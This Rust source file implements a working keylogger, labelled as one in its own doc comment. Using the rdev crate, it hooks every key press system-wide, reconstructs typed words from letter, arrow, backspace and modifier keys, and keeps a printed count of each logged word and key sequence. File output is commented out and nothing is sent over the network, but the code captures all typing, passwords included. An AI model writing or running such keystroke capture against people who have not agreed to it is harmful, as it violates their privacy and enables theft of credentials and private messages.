use std::collections::BTreeMap;
//use std::fs::OpenOptions;
//use std::io::Write;
use rdev::{
    Event,
    EventType::{self, *},
    Key::*,
};

/// Keylogger loop
pub fn log_keys() {
    // keep tack of cursor position using left and right arrow keys
    let mut cursor_pos = 0;
    // hold current word like this ["apple"]
    let mut key_buffer: Vec<String> = Vec::new();
    // hold all logged keys, separated in words, like this ["hello", "SPACE", "world!"]
    let mut key_log = BTreeMap::new();
    let mut mod_pressed = false;

    // blocking
    rdev::listen(move |event| {
        println!("processing event: {:?}", event);
        println!("buffer is: {:?}", key_buffer);

        match event.event_type {
            KeyPress(key_pressed) => {
                match key_pressed {
                    Space | Return | Enter => {
                        log_sequence(&mut key_log, format!("{:?}", key_pressed));
                        flush_buffer(&mut key_log, &mut key_buffer, &mut cursor_pos);
                    }
                    LeftArrow => {
                        log_sequence(&mut key_log, format!("{:?}", key_pressed));
                        if cursor_pos >= 1 {
                            cursor_pos -= 1;
                        }
                    }
                    RightArrow => {
                        log_sequence(&mut key_log, format!("{:?}", key_pressed));
                        if cursor_pos < key_buffer.len() {
                            cursor_pos += 1;
                        };
                    }
                    Backspace | Delete => {
                        log_sequence(&mut key_log, format!("{:?}", key_pressed));
                        if cursor_pos >= 1 {
                            match key_pressed {
                                Backspace => {
                                    cursor_pos -= 1;
                                    key_buffer.remove(cursor_pos);
                                }
                                Delete => {
                                    if cursor_pos != key_buffer.len() {
                                        key_buffer.remove(cursor_pos);
                                    }
                                }
                                _ => {
                                    panic!("Forgot a key to match?")
                                }
                            }
                        }
                    }
                    Alt | AltGr | ControlLeft | ControlRight | MetaLeft | MetaRight => {
                        mod_pressed = true;
                        flush_buffer(&mut key_log, &mut key_buffer, &mut cursor_pos);
                    }
                    _ if mod_pressed => {
                        // println!("[pressed while mod] event: {:?}", event);
                        add_key_to_buffer(& event, &mut key_buffer, cursor_pos);
                    },
                    _ /* if !mod_pressed*/ => {
                        // println!("[pressed while NO mod] event: {:?}", event);
                        if let Some(keycode) = &event.name {
                            // add letters to the buffer, as we want to record words!
                            if keycode.bytes().last() < Some(127_u8)
                                && keycode.bytes().last() > Some(31_u8)
                            {
                                add_key_to_buffer(&event, &mut key_buffer, cursor_pos);
                                cursor_pos += 1;
                            } else {
                                // these must be non-letters, adding them
                                log_sequence(&mut key_log, format!("{:?}", key_pressed));
                            }
                        } else {
                            panic!("not recorded {:?}", key_pressed);
                        }
                    }
                }
            }
            KeyRelease(key_released) => {
                match key_released {
                    Alt | AltGr | ControlLeft | ControlRight | MetaLeft | MetaRight => {
                        key_buffer.insert(0, format!("{:?} + ", key_released));
                        flush_buffer(&mut key_log, &mut key_buffer, &mut cursor_pos);
                        mod_pressed = false;
                    }
                    _ => { /* noop for other key releases*/ }
                }
            }
            _ => { /* ignoring all pther events */ }
        }
        println!("logged so far: {:?}", key_log);
    })
    .unwrap();
}

fn log_sequence(key_log: &mut BTreeMap<String, i32>, sequence: String) {
    key_log
        .entry(sequence)
        .and_modify(|count| *count += 1)
        .or_insert(1);
}

fn flush_buffer(
    key_log: &mut BTreeMap<String, i32>,
    key_buffer: &mut Vec<String>,
    cursor_pos: &mut usize,
) {
    let sequence = key_buffer.join("");
    key_buffer.clear();
    *cursor_pos = 0;
    log_sequence(key_log, sequence);
}

fn add_key_to_buffer(event: &Event, buffer: &mut Vec<String>, pos: usize) {
    let key_name = match &event.name {
        None => get_key_from_event_type(event.event_type),
        Some(empty_string) if empty_string.is_empty() => get_key_from_event_type(event.event_type),
        Some(blank) if blank == " " => get_key_from_event_type(event.event_type),
        Some(keycode)
            if (keycode.bytes().last() < Some(127_u8) && keycode.bytes().last() > Some(31_u8)) =>
        {
            // adding letters
            keycode.to_owned()
        }
        Some(_) => get_key_from_event_type(event.event_type),
    };
    buffer.insert(pos, key_name);
}

fn get_key_from_event_type(event_type: EventType) -> String {
    match event_type {
        KeyPress(key) | KeyRelease(key) => {
            let key_name = &format!("{:?}", key)[..];
            key_name.strip_prefix("Key").unwrap_or(key_name).to_string()
        }
        _ => panic!("not a key event! {:?}", event_type),
    }
}
